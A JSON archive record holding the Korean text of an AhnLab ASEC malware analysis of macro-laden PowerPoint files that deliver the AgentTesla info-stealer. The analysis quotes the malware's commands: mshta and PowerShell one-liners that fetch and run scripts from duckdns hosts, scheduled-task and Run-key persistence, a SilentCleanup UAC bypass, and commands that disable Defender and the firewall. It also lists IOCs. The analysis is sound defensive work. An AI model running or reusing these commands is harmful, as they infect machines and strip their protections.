{
    "id": "9d33368c-84e2-418a-b620-ccf34d94d2cd",
    "created_at": "2023-01-12T15:08:03.786682Z",
    "updated_at": "2025-03-27T02:05:55.34072Z",
    "deleted_at": null,
    "sha1_hash": "5f8beeacfca8b2e78d43d0105d68b2cc625966a1",
    "title": "2021-12-02 - Spreading AgentTesla through more sophisticated malicious PPT",
    "authors": "",
    "file_creation_date": "2022-05-28T23:18:26Z",
    "file_modification_date": "2022-05-28T23:18:26Z",
    "file_size": 3152337,
    "plain_text": "# 더욱 정교해진 악성 PPT 를 통해 AgentTesla 유포 중\n\n**asec.ahnlab.com/ko/29133/**\n\n2021년 12월 2일\n\nASEC 분석팀은 작년부터 꾸준하게 유포되고 있는 악성 PPT 파일에 대해 소개해왔다. 최근에\n는 악성 PPT 파일에서 실행되는 스크립트에 다양한 악성 기능이 추가 된 것을 확인하였다. 악\n성 PPT 파일이 실행되는 방식은 기존에 소개해왔던 방식과 동일하며, 악성 스크립트에 의해\n추가 악성코드 실행, Anti-AV, UAC bypass 등의 기능을 수행한다.\n\nPPT 파일 실행시, 아래와 같이 기존과 동일하게 매크로 포함 여부를 선택하는 알림창이 생성\n된다. 이때 매크로 포함 버튼을 선택하게 되면 악성 매크로가 자동으로 실행되게 된다.\n\n\n-----\n\n매크로 포함 여부 알림\n악성 매크로가 실행되면 파워 포인트 에러를 위장한 오류창을 생성하여 사용자가 악성 행위를\n알아차리기 힘들도록 하였다.\n\n오류창\n\n위장\n악성 매크로는 Auto_Open() 함수에 의해 자동으로 실행되는 형태로, 악성 행위에 사용되는 데\n이터는 난독화되어 있다. 난독화 해제시 아래와 같은 문자열을 확인할 수 있으며, shell 함수를\n통해 악성 명령어가 실행된다.\n\n\n-----\n\n난독화 해제 후 문자열\n악성 매크로에 의해 실행되는 악성 명령어는 아래와 같으며, 기존과 동일하게 mshta 프로세스\n를 통해 악성 url 에 접근하여 추가 스크립트를 실행하게 된다.\n\n악성 명령어\n\n“c:\\windows\\system32\\calc\\..\\mshta” “hxxps://hahahahh@j.mp/rendomchrsadowkaduaowidk”\n\n**Final URL**\n\nhxxps://download2389.mediafire.com/f68ak6xluypg/t1qm2d4ahq43wn3/2.doc\n\n해당 사이트에는 악성 vbscript 가 존재하며, 총 3개의 행위를 수행한다. 먼저, 런키에 파워쉘\n명령어를 저장 후 해당 명령어를 실행한다. 레지스트리 경로와 파워쉘 명령어는 아래와 같다.\n파워쉘 명령어는 두 개의 url 에 접속하여 추가 스크립트를 실행하게 된다. 추가 스크립트는\nvbscript 이후 설명되어 있다.\n\n레지스트리 경로\n\nHKEY_CURRENT_USER\\\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run:cwdfwiiuyqw\n\n파워쉘 명령어\n\n\n-----\n\npOwersHelL.exe -NoProfile -ExecutionPolicy Bypass -Command\ni’E’x(iwr(‘hxxp://www.minpowpoin.duckdns.org/p1/2.txt’) useB);i’E’x(iwr(‘hxxp://www.minpowpoin.duckdns.org/fin/c2.txt’) -useB);\n\nvbscript (1)\n이후 Shellexecute 를 통해 작업 스케줄러 등록 명령어를 실행하며, 명령어는 아래와 같다. 작\n업 스케줄러에 등록되는 명령어는 mshta 를 통해 악성 url 에 접속하는 기능으로 63분마다 해\n당 명령어가 반복된다. 현재 해당 url 은 접속이 불가능하다.\n\n작업 스케줄러 등록\n\nschtasks /create /sc MINUTE /mo 63 /tn kwdwdwfdfabvco /F /tr MsHtA\nhxxp://kukadunikkk@bakuzamokxxxala.duckdns.org/b1/2.txt open\n\nvbscript (2)\n마지막으로, 런키에 악성 mshta 명령어를 저장한다. 레지스트리 경로와 명령어는 아래와 같\n다. 해당 명령어는 런키에 등록되어 재부팅시 자동으로 실행되도록 하며 현재 해당 url 은 접속\n이 불가능하다.\n\n레지스트 경로\n\nHKEY_CURRENT_USER\\ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run:pilodkis\n\n**mshta 명령어**\n\nMsHTa hxxp://www.starinxxxgkular.duckdns.org/s1/2.txt\n\n\n-----\n\nvbscirpt (3)\n앞에서 언급한 vbscript 에서 실행되는 파워쉘 명령어는 두 개의 url 에 접속을 시도하며, 각 url\n에는 다른 기능을 수행하는 악성 파워쉘 명령어가 존재한다. 파워쉘 명령어는 각각 악성코드\n실행 및 anti-av, uac bypass 등의 기능을 수행한다. 먼저 첫번째 url 에서 실행되는 파워쉘 명\n령어는 악성 닷넷 실행 파일을 로드하는 기능을 수행한다. 로드되는 바이너리는 아래와 같은\n형태로 존재하며, gzip 을 통해 압축 해제되어 실행된다.\n\n인코딩된 악성 바이너리\n위와 같은 형태로 총 2개의 바이너리가 존재하는데, 하나는 악성 행위를 수행하는 payload 이\n며 나머지 하나는 payload 를 정상 프로세스에 인젝션하는 기능을 수행한다. 아래 명령어를 통\n해 악성 바이너리가 로드되며, 디코딩된 첫번째 닷넷 파일의 projFUD.alosh_rat 의 Execute 메\n소드를 실행하는 것을 확인할 수 있다. 또한\n“C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\aspnet_compiler.exe” 경로와 디코딩된\n두번째 닷넷 파일을 인자로 실행한다.\n\n악성 바이너리 로드\n\n\n-----\n\n실행되는 Execute 메소드는 아래와 같으며, aspnet_compiler.exe 프로세스를 생성 후 두번째\n닷넷 파일을 인젝션하여 악성 행위를 수행한다. 이때 인젝션되는 파일은 정보유출형 악성코드\n인 AgentTesla 로 확인되었다.\n\n두번째 url 에서 실행되는 파워쉘 명령어는 백신 프로그램 검사 및 권한 상승 등 다양한 기능을\n수행한다. 아래와 같이 특정 경로에 백신 프로그램이 존재하는 경우,\n“C:\\Users\\Public\\commander.vbs” 파일을 생성하며 윈도우 시작 폴더에 복사 후 실행한다.\ncommander.vbs 파일은 파워쉘 명령어를 통해 “C:\\Users\\Public\\Comola.ps1” 파일을 실행하\n는 기능을 수행한다.\n\n백신 프로그램 검사\nComola.ps1 파일은 [http://www.google.com 에](http://www.google.com/) 접속하여 다운로드되는 정상 스크립트로, 백신\n제품이 존재하는 경우 악성 행위가 실행되지 않도록 한다.\n\nComola.ps1 파일 생성\n검사 대상 백신 프로그램의 경로는 아래와 같다.\n\n– C:\\Program Files\\ESET\\ESET Security\\ecmds.exe\n\n– C:\\Program Files\\Avast Software\\Avast\\AvastUI.exe\n\n– C:\\Program Files\\Common Files\\McAfee\\Platform\\McUICnt.exe\n\n\n-----\n\n– C:\\Program Files\\Malwarebytes\\Anti-Malware\\mbamtray.exe\n\n– C:\\Program Files\\AVG\\Antivirus\\AVGUI.exe\n\n백신 프로그램이 존재하지 않는 경우, 아래와 같은 악성 행위가 수행된다. 다수의 스크립트 파\n일이 생성되며 각 파일에 대한 설명은 아래와 같다.\n\n**1. C:\\Users\\Public\\cooki.ps1**\n\n해당 파일은 특정 레지스트리 값을 변경하는 파워쉘 명령어가 포함되어 있으며, 레지스트리\n값을 변경하여 윈도우 보안 알림 메시지 창을 비활성화하게 된다.\n\n변경되는 레지스트리\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Security and\nMaintenance\\Checks]\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Security and\nMaintenance\\Checks{01979c6a-42fa-414c-b8aa-eee2c8202018}.check.100]\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Security and\nMaintenance\\Checks{01979c6a-42fa-414c-b8aa-eee2c8202018}.check.101]\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Security and\nMaintenance\\Checks{088E8DFB-2464-4C21-BAD2-F0AA6DB5D4BC}.check.0]\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Security and\nMaintenance\\Checks{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}.check.101]\n\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Security and\nMaintenance\\Checks{134EA407-755D-4A93-B8A6-F290CD155023}.check.8001] 외 다\n수\n\n레지스트리 변경\n**2. C:\\Users\\Public\\Cola.ps1**\n\n해당 파일은 UAC bypass 기능을 수행한다. SID 를 검사하여 관리자일 경우,\n“C:\\Users\\Public\\common.vbs” 파일을 실행한다. 관리자가 아닐 경우, 윈도우 서비스인\nSilentCleanup 작업을 이용하여 권한을 상승한다. SilentCleanup 서비스는 실행시 자동으로\n상승된 권한으로 실행되며 %windir%\\system32\\cleanmgr.exe 파일을 실행한다. 이때 환경 변\n수 %windir% 를 조작하여 원하는 명령어를 상승된 권한으로 실행시킬 수 있다. 해당 파일에서\n는 환경변수를 아래와 같이 변경 후 SilentCleanup 서비스를 시작한다.\n\n환경변수 변경\n\npowershell -ep bypass -w h $PSCommandPath;\n\n\n-----\n\nUAC Bypass\n**3. C:\\Users\\Public\\Tackel.ps1**\n\n해당 파일은 윈도우 디펜더를 비활성화하는 기능을 수행한다. 특정 경로 및 프로세스를 윈도\n우 디펜더 예외 경로로 설정하며, AgentTesla 가 인젝션되는 aspnet_compiler.exe 프로세스\n및 악성 행위에 사용되는 프로세스가 포함되어 있다. 또한 호스트 파일 변경 및 .NET\nFramework 3.5 기능 파일 설치를 수행한다.\n\n윈도우 디펜더 예외 경로 및 프로세스\n\nC:\\\n\nD:\\\n\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\nC:\\Windows\\System32\\\n\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Msbuild.exe\n\nC:\\Windows\\System32\\kernel32.dll\n\nexplorer.exe\n\naspnet_compiler.exe\n\nMshta.exe\n\npowershell.exe 외 다수\n\n윈도우 디펜더 비활성화\n\nNew-ItemProperty -Path\nHKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA\n-PropertyType DWord -Value 0\n\nSet-MpPreference -PUAProtection disable\n\nSet-MpPreference -HighThreatDefaultAction 6\n\nSet-MpPreference -ModerateThreatDefaultAction 6\n\nSet-MpPreference -LowThreatDefaultAction 6\n\nSet-MpPreference -SevereThreatDefaultAction 6\n\nSet-MpPreference -ScanScheduleDay 8\n\nnetsh advfirewall set allprofiles state off\n\n호스트 파일 변경\n\nn66.254.114.41 virusscan.jotti.org\n\n\n-----\n\n윈도우 디펜더 비활성화, 호스트 파일 변경, 닷넷 프레임워크 설치\n**4. C:\\Users\\Public\\common.vbs**\n\n해당 파일은 Tackel.ps1, cooki.ps1 파일을 실행한다.\n\n**5. C:\\Users\\Public\\Chrome.vbs**\n\n해당 파일은 Cola.ps1 파일을 실행한다.\n\n최종적으로 Chrome.vbs 파일이 실행된다. 이후 추가 파일들이 순차적으로 실행되어 백신 프\n로그램 검사 및 UAC Bypass, 윈도우 디펜더 비활성화 등 추가 악성 코드의 실행을 위한 환경\n을 설정하게 된다.\n\n악성 PPT 파일은 작년부터 꾸준하게 변형되고 있으며 다양한 악성 기능이 추가되어 유포되고\n있다. 사용자들은 출처가 불분명한 파일의 열람은 자제해야하며, 문서에 포함된 의심 매크로\n는 실행하지 않도록 해야 한다.\n\n**[파일진단]**\n\nDownloader/PPT.Generic\nTrojan/VBS.Runner\nTrojan/PowerShell.Bypass\nTrojan/PowerShell.Disabler\n\n**[행위** 진단]\n\nExecution/MDP.Mshta.M3546\n\n\n-----\n\n**[IOC 정보]**\n\neceb63e68b9c3ea9d55e1a6cb1e25d5d\n35b2343da6d21a5cede2751026be78f8\na6fd5561622b8c942aa40a97a4baece8\n61cc1dac681dfcbcd8781a498684d434\n79106a7027e6bf3aff964ccf694d99fb\n199afc572f448386b8a72f872b64778c\n8e7581085b48c219c5fafdf0868a644b\nhxxps://download2389.mediafire.com/f68ak6xluypg/t1qm2d4ahq43wn3/2.doc\nhxxp://www.minpowpoin.duckdns.org/p1/2.txt\nhxxp://www.minpowpoin.duckdns.org/fin/c2.txt\nhxxp://kukadunikkk@bakuzamokxxxala.duckdns.org/b1/2.txt\nhxxp://www.starinxxxgkular.duckdns.org/s1/2.txt\n\n**[기존** 악성 PPT 관련 블로그]\n\n\n-----\n\nOutlook.exe 를 이용한 악성 PPT 매크로 유포 중 – ASEC BLOG\n최근 ASEC 분석팀은 꾸준하게 유포되고 있는 악성 PPT 파일의 변형을 확인하였다. 기존과\n동일하게 mshta.exe 를 이용하여 악성 스크립트를 실행하는 동작 방식으로, 중간 과정에서\noutlook.exe 프로세스를 이용하는 방식이 추가되었다. 악성 PPT 파일은 아래와 같이 피싱 메\n일의 첨부 파일을 통해 유포되고 있으며, 구매 문의와 관련된 내용을 포함하고 있다. 또한 이전\n유형과 동일하게 악성 PPT 파일은 PDF 확장자로 위장한 것을 확인할 수 있다. 유포 파일명\nPurchase Inquiry_pdf.ppt 악성 PPT 파…\n\n지속적으로 유포되는 파워포인트 유형의 악성 첨부파일 – ASEC BLOG\n지난 4월, 아래의 포스팅을 통해 PPT파일을 매개체로 하여 유포되는 악성코드에 대해 소개한\n바 있다. ASEC 분석팀은 파워포인트 유형의 PPAM 파일을 이용한 악성 행위가 최근까지도 지\n속되는 것을 확인하여 이를 알리려 한다. 4월에 소개한 내용은 파워포인트에 포함된 매크로가\n\n\n-----\n\n실행되면 mshta.exe를 이용하여 악성 스크립트가 삽입된 blogspot 웹페이지의 소스가 공격에\n바로 사용되었으나, 이번에는 powershell.exe/wscript.exe를 이용한 프로세스가 추가되어 보\n다 더 복잡해진 것이 특징이라고 할 수 있다. V…\n\n피싱메일에 첨부된 PPT 파일을 통해 유포되는 AgentTesla !! – ASEC BLOG\nASEC 분석팀은 피싱메일에 악성 파워포인트(*.PPT) 파일이 첨부되어 유포중인 것을 확인하\n였다. 악성코드가 유포되고 동작하는 방식은 ASEC 블로그를 통해 지속적으로 소개해왔던 방\n식에서 크게 벗어나지 않으며, 기존에 사용했던 방법들을 조합한 것이 특징이라고 할 수 있다.\n지난 2020년 7월에 ASEC블로그에 소개한 내용(‘AgentTesla 악성코드 국내에 어떻게 유포되\n고 있나?’)은 공격자가 Pastebin 서비스를 사용하여 AgentTesla 를 유포한 것이며, 11월에 소\n개한 내용(‘국세청 ‘전자세금계산서’ 사칭한 Lok…\n\nAgentTesla 악성코드 국내에 어떻게 유포되고 있나? – ASEC BLOG\n\n\n-----\n\n올해 초부터 피싱 메일에 악성 파워포인트( .PPT) 파일이 첨부되어 유포중인 사례가 확인되고\n있다. ASEC 분석팀에서는 최근 이러한 공격 방식을 통해 AgentTesla가 최종 실행된 것을 포\n착하여 이에 대해 알리려한다. 해외에서는 아래 블로그처럼 해외에서도 올 1월 정보유출형 악\n성코드 azorult가 메일에 첨부된 PPT를 통해 유포되었다. (해외 블로그 :\nhttps://appriver.com/resources/blog/january-2020/powerpoint-malware-references-drakelyrics-dro…\n연관 IOC 및 관련 상세 분석 정보는 안랩의 차세대 위협 인텔리전스 플랫폼 ‘AhnLab TIP’ 구\n독 서비스를 통해 확인 가능하다.\n\n[Categories:악성코드](https://asec.ahnlab.com/ko/category/malware/) 정보\n\n[Tagged as:AGENTTESLA,](https://asec.ahnlab.com/ko/tag/agenttesla/) [PPT악성코드,](https://asec.ahnlab.com/tag/ppt%ec%95%85%ec%84%b1%ec%bd%94%eb%93%9c/) [VBA매크로](https://asec.ahnlab.com/tag/vba%eb%a7%a4%ed%81%ac%eb%a1%9c/)\n\n\n-----",
    "language": "KO",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-02 - Spreading AgentTesla through more sophisticated malicious PPT.pdf"
    ],
    "report_names": [
        "2021-12-02 - Spreading AgentTesla through more sophisticated malicious PPT.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536083,
    "ts_updated_at": 1743041155,
    "ts_creation_date": 1653779906,
    "ts_modification_date": 1653779906,
    "files": {
        "pdf": "https://archive.orkl.eu/5f8beeacfca8b2e78d43d0105d68b2cc625966a1.pdf",
        "text": "https://archive.orkl.eu/5f8beeacfca8b2e78d43d0105d68b2cc625966a1.txt",
        "img": "https://archive.orkl.eu/5f8beeacfca8b2e78d43d0105d68b2cc625966a1.jpg"
    }
}